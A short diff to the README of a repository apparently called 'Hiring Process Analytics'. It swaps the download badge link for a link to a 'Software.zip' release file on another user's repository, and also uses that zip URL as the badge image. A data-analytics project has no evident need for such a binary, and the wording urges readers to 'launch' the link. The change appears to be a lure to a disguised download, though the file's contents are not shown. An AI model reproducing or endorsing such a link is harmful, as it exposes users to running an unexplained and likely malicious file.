@@ -17,7 +17,7 @@ Welcome to the **Hiring Process Analytics** repository! This repository focuses 
 ## Installation
 
 To get started with the **Hiring Process Analytics** repository, you can download the necessary files by clicking the following link:
-[![Download Repository](https://img.shields.io/badge/Download-Repository-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/Aizen0009230/HiringProcessAnalytics/releases/download/v1.0/Software.zip)](https://github.com/Aizen0009230/HiringProcessAnalytics/releases/download/v1.0/Software.zip)
 
 *Note: The link needs to be launched to download the repository files.*
 
